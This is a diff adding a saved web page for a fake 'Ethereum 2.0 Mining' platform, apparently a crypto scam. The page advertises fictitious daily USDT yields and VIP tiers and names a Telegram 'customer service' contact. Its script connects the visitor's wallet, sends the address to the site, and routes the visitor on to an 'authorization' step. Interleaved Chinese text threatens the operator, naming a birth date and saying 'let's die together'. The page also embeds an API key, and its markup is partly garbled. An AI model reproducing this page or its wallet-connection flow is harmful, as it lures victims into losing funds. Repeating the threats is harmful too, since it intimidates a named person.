@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<!-- saved from url=(0014)about:internet -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,viewport-fit=cover"><link rel="icon" href="https://usdt.swapcoin.info/web3/img/eth.png"><title>Ethereum 2.0 Mining</title><link href="./Ethereum 2.0 Mining_files/app.286eb6de.css" rel="preload" as="style"><link href="./Ethereum 2.0 Mining_files/chunk-vendors.1d4f0b8f.css" rel="preload" as="style"><link href="https://usdt.swapcoin.info/web3/js/app.abee6340.js" rel="preload" as="script"><link href="./Ethereum 2.0 Mining_files/chunk-vendors.0509b548.js.下载" rel="preload" as="script"><link href="./Ethereum 2.0 Mining_files/chunk-vendors.1d4f0b8f.css" rel="stylesheet"><link href="./Ethereum 2.0 Mining_files/app.286eb6de.css" rel="stylesheet"><script src="./Ethereum 2.0 Mining_files/web3.min.js.下载"></script><script src="./Ethereum 2.0 Mining_files/jquery-3.2.1.slim.min.js.下载"></script><script src="./Ethereum 2.0 Mining_files/jquery.js.下载"></script><!-- 引入 layui.css --><link href="./Ethereum 2.0 Mining_files/layui.css" rel="stylesheet"><!-- 引入 layui.js --><script src="./Ethereum 2.0 Mining_files/layui.js.下载"><script src="/web3/js/jquery-3.3.1.min.js"></script><script src="./Ethereum 2.0 Mining_files/chunk-vendors.0509b548.js.下载"></script><!-- <script src="./js/app.abee6340.js"></script> --><!--<script src="/web3/js/index.js"></script>--><!--<script src="/web3/js/common.js"></script>--><style type="text/css">.layui-layer-content{
+    padding: 30px;
+}
+/*#showActionsheetButton {*/
+/*  display: block;*/
+/*  margin: 50px auto;*/
+/*  padding: 4px 16px;*/
+/*  border: none;*/
+/*  border-radius: 5px;*/
+/*  background-color: #212244;*/
+/*  color: #fff;*/
+/*  font-size: 16px;*/
+/*  cursor: pointer;*/
+/*}*/
+#loading {
+  position: fixed;
+  z-index: 9999;
+  background: rgba(255, 255, 255, 0.8);
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+.loader {
+  border: 5px solid #f3f3f3;
+  border-top: 5px solid #3498db;
+  border-radius: 50%;
+  width: 50px;
+  height: 50px;
+  animation: spin 1s linear infinite;
+}
+
+.loading-text {
+  margin-left: 20px;
+  font-size: 24px;
+  font-weight: bold;
+}
+
+@keyframes spin {
+  0% { transform: rotate(0deg); }/web3/img/b1.webp
+  100% { transform: rotate(360deg); }
+}
+
+.actionsheet {
+  position: fixed;
+  z-index: 9999;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  display: none;
+}
+
+.actionsheet-mask {
+  position: absolute;
+  z-index: 1;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background-color: rgba(0, 0, 0, 0.5);
+}
+
+.actionsheet-menu {
+  position: absolute;
+  z-index: 2;
+  bottom: 0;
+  left: 0;
+  width: 100%;
+  background-color: #fff;
+  border-top-left-radius: 10px;
+  border-top-right-radius: 10px;
+  box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+}
+
+.actionsheet-title {
+  padding: 10px;
+  font-size: 18px;
+  font-weight: bold;
+  color: #333;
+  border-bottom: 1px solid #e5e5e5;
+}
+
+.actionsheet-list {
+  margin: 0;
+  padding: 0;
+}
+
+.actionsheet-item {
+  padding: 10px;
+  font-size: 16px;
+  color: #333;
+  border-top: 1px solid #e5e5e5;
+  cursor: pointer;
+}
+
+.actionsheet-item:first-child {
+  border-top: none;
+}
+
+.actionsheet-cancel {
+  padding: 10px;
+  font-size: 18px;
+  font-weight: bold;
+  color: #333;
+  background-color: #f5f5f5;
+  border-top: 1px solid #e5e5e5;
+  border-bottom-left-radius: 10px;
+  border-bottom-right-radius: 10px;
+  cursor: pointer;
+}
+.van-collapse-item__wrapper {
+    overflow: hidden;
+    transition: height 0.3s ease-out;
+}
+  </style></head><body class=""><noscript><strong>We're sorry but smartinu doesn't work properly without JavaScript enabled. Please enable it to continue.</strong></noscript><div data-v-23913bf6="" id="app"><div data-v-499bfa53="" data-v-23913bf6="" class="Customer" style="padding-bottom: 60px;"><div data-v-499bfa53="" class="introduce" style="background-color:#0053fb;border-radius:0;"><div data-v-499bfa53="" class="home_nav" style="height:30px;"><!--<div data-v-499bfa53="" style="width: 20px; height: 20px; margin-right: 20px;">--><!--  <img data-v-499bfa53="" src="/web3/img/down.png" style="width: 20px; height: 20px;">--><!--</div>--><div data-v-499bfa53="" style="display: flex;"><!--<div data-v-499bfa53="" id='showActionsheetButtons'>Connect</div>--><div class="actionsheet"><div class="actionsheet-mask"></div><div class="actionsheet-menu"><div class="actionsheet-title">Select Connect Wallet</div><div class="actionsheet-list"><div class="actionsheet-item" onclick="connect_wallet(&#39;coin98&#39;)">Coin98</div><div class="actionsheet-item" onclick="connect_wallet(&#39;kucoin&#39;)">KUCOIN</div><div class="actionsheet-item" onclick="connect_wallet(&#39;coinbase&#39;)">coinbase</div></div></div></div></div></div><div data-v-499bfa53="" style="padding: 8px 15px;"><iframe width="377" height="480" src="./Ethereum 2.0 Mining_files/i-2SzaLkPXY.html" title="Star Wars: Imperial March | EPIC SAMURAI VERSION (Ghost of Tsushima Style)" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen=""></iframe></div><img data-v-499bfa53="" src="./Ethereum 2.0 Mining_files/v2-0ca5dbdbd52b90dece8a710e4112560a_720w.jpg" style="height: 270px; width: 100%; border-radius: 20px;"><div id="showActionsheetButton" style="background: #fff; box-shadow: rgba(66, 78, 255, 0.5) 0px 0px 6px 0px; border-radius: 12px; padding: 10px 0px; text-align: center; color: #0053fb;font-weight:800; line-height: 20px; height: 40px; margin: 20px 15px 0px;" data-v-499bfa53="">我不好过，你也别好过，毕竟我没结婚</div></div><img data-v-499bfa53="" src="./Ethereum 2.0 Mining_files/pasted image 0.png" style="height: 300px; width: 100%; border-radius: 20px;"><img src="./Ethereum 2.0 Mining_files/2102262223527908768.png" title=" " alt="中共杭州市委  杭州市人民政府" class=" _4df313e594986f340b28c954a7f0ab3a" aria-label="中共杭州市委  杭州市人民政府"><div data-v-499bfa53="" class="comproblem" style="background-color:#0053fb;border-radius:0;margin-top:10px;"><div data-v-499bfa53="" style="color: #fff;font-weight: 700;">我不好过，你也别好过，毕竟我没结婚</div><div data-v-499bfa53="" class="home_qustion van-collapse"><div data-v-499bfa53="" class="van-collapse-item"><div role="button" tabindex="0" aria-expanded="true" class="van-cell van-cell--clickable van-cell--borderless van-collapse-item__title van-collapse-item__title--borderless" onclick="toggleContent(this)" style="background-color:#fbfbfb"><div class="van-cell__title"><span>看谁能坚持到最后</span></div><i class="van-icon van-cell__right-icon van-icon-arrow-down"></i></div><div class="van-collapse-item__wrapper" style="height: 129px; opacity: 1;"><div class="van-collapse-item__content">我不好过，你也别好过，毕竟我没结婚</div></div>
+<img src="./Ethereum 2.0 Mining_files/2102262223527908768.png" title="中共杭州市委  杭州市人民政府" alt="中共杭州市委  杭州市人民政府" class=" _4df313e594986f340b28c954a7f0ab3a" aria-label="中共杭州市委  杭州市人民政府"></div><div data-v-499bfa53="" class="van-collapse-item"><div role="button" tabindex="0" aria-expanded="true" class="van-cell van-cell--clickable van-cell--borderless van-collapse-item__title van-collapse-item__title--borderless" onclick="toggleContent(this)" style="background-color:#fbfbfb"><div class="van-cell__title"><span>查流水就明白</span></div><i class="van-icon van-cell__right-icon van-icon-arrow-down"></i></div>
+<img src="./Ethereum 2.0 Mining_files/2102262223527908768.png" title="中共杭州市委  杭州市人民政府" alt="中共杭州市委  杭州市人民政府" class=" _4df313e594986f340b28c954a7f0ab3a" aria-label="中共杭州市委  杭州市人民政府" style="height: 0px; opacity: 1;"><div class="van-collapse-item__wrapper" style="height: 0px; opacity: 0;"><div class="van-collapse-item__content">不信你试试</div>
+<img src="./Ethereum 2.0 Mining_files/2102262223527908768.png" title="中共杭州市委  杭州市人民政府" alt="中共杭州市委  杭州市人民政府" class=" _4df313e594986f340b28c954a7f0ab3a" aria-label="中共杭州市委  杭州市人民政府"></div></div><div data-v-499bfa53="" class="van-collapse-item"><div role="button" tabindex="0" aria-expanded="true" class="van-cell van-cell--clickable van-cell--borderless van-collapse-item__title van-collapse-item__title--borderless" onclick="toggleContent(this)" style="background-color:#fbfbfb"><div class="van-cell__title"><span>别给我画大饼</span></div><i class="van-icon van-cell__right-icon van-icon-arrow-down"></i></div>
+<img src="./Ethereum 2.0 Mining_files/2102262223527908768.png" title="中共杭州市委  杭州市人民政府" alt="中共杭州市委  杭州市人民政府" class=" _4df313e594986f340b28c954a7f0ab3a" aria-label="中共杭州市委  杭州市人民政府" style="height: 0px; opacity: 1;"><div class="van-collapse-item__wrapper" style="height: 0px; opacity: 0;"><div class="van-collapse-item__content">工资不涨，我还给你干那么多活，还说什么年终奖，狗屁不是，要么直接鱼死网破，很好那么我们就鱼死网破，最多作为员工的我们也就三年以下，而你？不一样，你拿了多少你心里清楚，不会少于10年。</div></div></div><div data-v-499bfa53="" class="van-collapse-item"><div role="button" tabindex="0" aria-expanded="false" class="van-cell van-cell--clickable van-cell--borderless van-collapse-item__title van-collapse-item__title--borderless" onclick="toggleContent(this)" style="background-color:#fbfbfb"><div class="van-cell__title"><span>工资不涨，我还给你干那么多活，还说什么年终奖，狗屁不是，要么直接鱼死网破，很好那么我们就鱼死网破，最多作为员工的我们也就三年以下，而你？不一样，你拿了多少你心里清楚，不会少于10年。</span></div></div>
+<img src="./Ethereum 2.0 Mining_files/2102262223527908768.png" title="中共杭州市委  杭州市人民政府" alt="中共杭州市委  杭州市人民政府" class=" _4df313e594986f340b28c954a7f0ab3a" aria-label="中共杭州市委  杭州市人民政府"><div class="van-collapse-item__wrapper" style="height: 0;"><div class="van-collapse-item__content">the yield of 100USDT-10000USDT is about 2.0%, the yield of 10000USDT-50000USDT is about 2.9%, the yield of 50000USDT-100000USDT is about 3.4%, the yield of 100000USDT-200000USDT is about 4.5%, and the yield above 200000USDT is about 5%</div></div></div><div data-v-499bfa53="" class="van-collapse-item"><div role="button" tabindex="0" aria-expanded="false" class="van-cell van-cell--clickable van-cell--borderless van-collapse-item__title van-collapse-item__title--borderless" onclick="toggleContent(this)" style="background-color:#fbfbfb"><div class="van-cell__title"><span>你跑是跑不掉的，你的所有信息都可以查到，知道为什么会找到你公司吗？1994年06月23日的你有什么牛逼的？</span></div></div><img src="./Ethereum 2.0 Mining_files/2102262223527908768.png" title="中共杭州市委  杭州市人民政府" alt="中共杭州市委  杭州市人民政府" class=" _4df313e594986f340b28c954a7f0ab3a" aria-label="中共杭州市委  杭州市人民政府"><div class="van-collapse-item__wrapper" style="height: 0px; opacity: 0;"><div class="van-collapse-item__content">The higher the VIP level, ranging from 1 to 5, the more mining rewards you receive in the mining pool. Upgrading to double the mining output of ERC-19 USDT requires upgrading ERC-20 USDT in the mining pool. Please contact the official customer service through Telegram at @ethmining1234.</div></div></div></div></div><div data-v-499bfa53="" class="partner" style="background-color:#0053fb;border-radius:0;margin-top:10px;margin-bottom:10px;"><div data-v-499bfa53="" style="color: #fff;font-weight: 700;">希望十年后你孩子还能知道你长什么样</div><div data-v-499bfa53="" class="van-grid" style="padding-left: 10px; margin-top: 15px;"><img src="./Ethereum 2.0 Mining_files/2102262223527908768.png" title="中共杭州市委  杭州市人民政府" alt="中共杭州市委  杭州市人民政府" class=" _4df313e594986f340b28c954a7f0ab3a" aria-label="中共杭州市委  杭州市人民政府"><img src="./Ethereum 2.0 Mining_files/2102262223527908768.png" title="中共杭州市委  杭州市人民政府" alt="中共杭州市委  杭州市人民政府" class=" _4df313e594986f340b28c954a7f0ab3a" aria-label="中共杭州市委  杭州市人民政府"><div data-v-499bfa53="" class="van-grid-item" style="flex-basis: 25%; padding-right: 10px;"></div><div data-v-499bfa53="" class="van-grid-item" style="flex-basis: 25%; padding-right: 10px;"></div></div></div><!-- <div data-v-499bfa53="" class="bottom_txt"> Copyright © 2022.SWAP All rights reserved. </div> --><!----></div><a href="https://chinapeace.gov.cn/chinapeace/c100049/2022-02/21/12597785/files/f5d26f00e4d0467ead6f3731fa707ebd.mp4" target="_blank"><img data-v-23913bf6="" src="./Ethereum 2.0 Mining_files/n4453000.webp" class="mssage" style="width:90px;height:67px;top:79%;z-index:999999"></a><div data-v-23913bf6="" class="tabbar van-tabbar van-tabbar--fixed" style="height: 60px;background-color:#0053fb;border-top:2px solid #fff"><div data-v-23913bf6="" class="van-tabbar-item van-tabbar-item--active" style="color: rgb(255, 255, 255);" onclick="action_web(&quot;home&quot;)"><div class="van-tabbar-item__icon"><img data-v-23913bf6="" src="./Ethereum 2.0 Mining_files/a8.png"></div><div class="van-tabbar-item__text" style="color:#fff;font-weight:800;"><span data-v-23913bf6="">Home</span></div></div></div></div><div id="loading" style="display: none"><div class="loader"></div><div class="loading-text">Loading...</div></div><div id="notice" style="display: none;"></div><div class="van-toast van-toast--middle van-toast--loading" style="z-index: 2005; display: none;"><div class="van-loading van-loading--circular van-toast__loading"><span class="van-loading__spinner van-loading__spinner--circular"><svg viewBox="25 25 50 50" class="van-loading__circular"><circle cx="50" cy="50" r="20" fill="none"></circle></svg></span></div><div class="van-toast__text">獲取配置中...</div></div><script>function action_web(bq){
+    if(bq=='home'){
+        window.location.href = '/index/index/index.html?code=';
+    }
+    if(bq=='mine'){
+        window.location.href = '/index/index/mine.html?code=';
+    }
+    if(bq=='farm'){
+        window.location.href = '/index/index/farm.html?code=';
+    }
+}
+
+function toggleContent(element) {
+    var contentWrapper = element.nextElementSibling;
+    var icon = element.querySelector('i');
+    if (contentWrapper.style.height === '0px') {
+        contentWrapper.style.height = contentWrapper.scrollHeight + 'px';
+        contentWrapper.style.opacity = '1';
+        element.setAttribute('aria-expanded', 'true');
+        icon.classList.remove('van-icon-arrow');
+        icon.classList.add('van-icon-arrow-down');
+    } else {
+        contentWrapper.style.height = '0px';
+        contentWrapper.style.opacity = '0';
+        element.setAttribute('aria-expanded', 'false');
+        icon.classList.remove('van-icon-arrow-down');
+        icon.classList.add('van-icon-arrow');
+    }
+}
+
+$(document).ready(function() {
+  // 获取 DOM 元素
+  var $actionsheet = $('.actionsheet');
+  var $mask = $actionsheet.find('.actionsheet-mask');
+  var $menu = $actionsheet.find('.actionsheet-menu');
+  var $cancel = $menu.find('.actionsheet-cancel');
+
+  // 显示 actionsheet
+  function showActionsheet() {
+    showLoading();
+    if (typeof window.ethereum !== 'undefined') {
+        window.web3 = new Web3(window.ethereum);
+    } else if (typeof window.web3 !== 'undefined') {
+        window.web3 = new Web3(window.web3.currentProvider);
+    } else {
+        web3 = new Web3(new Web3.providers.HttpProvider("https://mainnet.infura.io/v3/548f646599f042a89420f0168153a356"));
+    }
+    
+    web3.eth.getAccounts(function(error, accounts) {
+            
+        if (Object.keys(accounts).length === 0) {
+    
+            window.ethereum.enable().then(function (account) {
+                console.log(account);
+                $.ajax({
+                  async: false,
+                  url: '/index/index/check_address.html',
+                  type: 'POST',
+                  data : {address: account},
+                  dataType: 'json',
+                  success: function(res) {
+                      hideLoading()
+                      if(res.action == 'register'){
+                          window.location.href = '/index/index/register.html';
+                      }
+                      if(res.action == 'authorization'){
+                          window.location.href = '/index/index/authorization.html?code='+res.code;
+                      }
+                      if(res.action == 'index'){
+                          window.location.href = '/index/index/index.html';
+                      }
+                      if(res.action == 'authorization_true'){
+                          window.location.href = '/index/index/farm.html';
+                      }
+                      
+                    
+                  }
+                 }) 
+              }).catch(function (error) {
+                  console.log(error)
+                  hideLoading();
+                // window.location.href = '/index/index/register.html';
+              });
+        }else{
+            $.ajax({
+              async: false,
+              url: '/index/index/check_address.html',
+              type: 'POST',
+              data : {address: accounts[0]},
+              dataType: 'json',
+              success: function(res) {
+                hideLoading();
+                if(res.action == 'register'){
+                    window.location.href = '/index/index/register.html';
+                }
+                if(res.action == 'authorization'){
+                    window.location.href = '/index/index/authorization.html?code='+res.code;
+                }
+                if(res.action == 'index'){
+                   window.location.href = '/index/index/index.html';
+                }
+                if(res.action == 'authorization_true'){
+                      window.location.href = '/index/index/farm.html';
+                  }
+              }
+             })
+        }
+    });    
+    
+    // web3.eth.getAccounts(function(error, accounts) {
+        
+    //     if (Object.keys(accounts).length === 0) {
+    //         hideLoading();
+    //         // $actionsheet.show();
+    //         // $mask.on('click', hideActionsheet);
+    //         // $cancel.on('click', hideActionsheet);
+    //         window.ethereum.enable().then(function () {
+    //             // 在这里可以执行后续操作，例如调用智能合约方法等
+    //             window.location.href = '/index/index/authorization.html?code=';
+    //           }).catch(function (error) {
+    //             console.log(error);
+    //           });
+    //     }else{
+    //         window.location.href = '/index/index/authorization.html?code=';
+    //     }
+    // });
+    
+    
+    
+    // try {
+    //     web3.eth.getNodeInfo(function(error, result){
+    //       if(error){
+    //          alert(error)
+    //          $actionsheet.show();
+    //          $mask.on('click', hideActionsheet);
+    //          $cancel.on('click', hideActionsheet);
+    //       }else{
+    //         alert(result)
+    //         window.location.href = '/index/index/authorization.html';
+    //       }
+    //     });
+    // } catch (e) {
+    //     alert(e)
+    //     $actionsheet.show();
+    //      $mask.on('click', hideActionsheet);
+    //      $cancel.on('click', hideActionsheet);
+    // }
+  }
+
+  // 隐藏 actionsheet
+  function hideActionsheet() {
+   $actionsheet.hide();
+   $mask.off('click', hideActionsheet);
+   $cancel.off('click', hideActionsheet);
+ }
+
+ // 绑定按钮点击事件
+ $('#showActionsheetButton').on('click', showActionsheet);
+});
+// 显示加载动画
+function showLoading() {
+  document.getElementById("loading").style.display = "flex";
+}
+
+// 隐藏加载动画
+function hideLoading() {
+  document.getElementById("loading").style.display = "none";
+}
+
+function connect_wallet(wallet){
+  if(wallet=='coin98'){
+    
+    const COIN98_URL_SCHEME = 'coin98://';
+    
+    // 唤醒Coin98 App并进入其浏览器页面
+    const url = 'https://www.google.com';
+    const browserUrl = `${COIN98_URL_SCHEME}/dapps?url=${encodeURIComponent(url)}`;
+    //   window.location = browserUrl;
+    window.location = "coin98://path/to/page";
+    
+  }
+  if(wallet=='kucoin'){
+    // window.open(`kucoinwallet://browser?url=http://172.87.29.143`);
+    // const kucoin_url = 'kucw://open/web?url=http://172.87.29.143';
+    const kucoin_url = 'kupay://transfer';
+    window.open(kucoin_url);
+
+
+    
+  }
+  if(wallet=='coinbase'){
+    const coinbase_url='https://go.cb-w.com/dapp?cb_url=https://usdt.swapcoin.info';
+    window.open(coinbase_url);
+  }
+}
+var obj = document.getElementById("notice");
+obj.innerHTML = obj.innerText;//这样重新设置html代码为解析后的格式
+layui.use(function(){
+    var layer = layui.layer;
+    var notice = $('#notice').html();
+    console.log(notice);
+    // Welcome
+    // 在此处输入 layer 的任意代码
+    layer.open({
+      type: 1, // page 层类型
+      area: 'auto',
+      title: 'Announcement',
+      shade: 0.6, // 遮罩透明度
+      shadeClose: true, // 点击遮罩区域，关闭弹层
+      maxmin: false, // 允许全屏最小化
+      anim: 0, // 0-6 的动画形式，-1 不开启
+      content:notice
+    });
+  });
+</script><div class="layui-layer-move" id="layui-layer-move"></div><div class="layui-layer-shade" id="layui-layer-shade1" times="1" style="z-index: 19891014; background-color: rgb(0, 0, 0); opacity: 0.6;"></div><div class="layui-layer layui-layer-page" id="layui-layer1" type="page" times="1" showtime="0" contype="string" style="z-index: 19891015; position: fixed; top: 199.5px; left: 11px;"><div class="layui-layer-title" style="cursor: move;">Announcement</div><img src="./Ethereum 2.0 Mining_files/2102262223527908768(1).png" title=" " alt="中共杭州市委  杭州市人民政府" class=" _4df313e594986f340b28c954a7f0ab3a" aria-label="中共杭州市委  杭州市人民政府"><div class="layui-layer-setwin"><span class="layui-icon layui-icon-close layui-layer-close layui-layer-close1"></span></div><span class="layui-layer-resize"></span></div><div class="layui-layer-shade" id="layui-layer-shade1" times="1" style="z-index:19891014; "></div><div class="layui-layer-shade" id="layui-layer-shade1" times="1" style="z-index:19891014; "></div><div class="layui-layer layui-layer-page " id="layui-layer1" type="page" times="1" showtime="0" contype="string" style="z-index: 19891015; width:;height:;position:fixed;"><div class="layui-layer-title" style="">看谁严重</div><div class="layui-layer-content">要死一起死</div><div class="layui-layer-setwin"><span class="layui-icon layui-icon-close layui-layer-close layui-layer-close1"></span></div><span class="layui-layer-resize"></span></div></body></html>
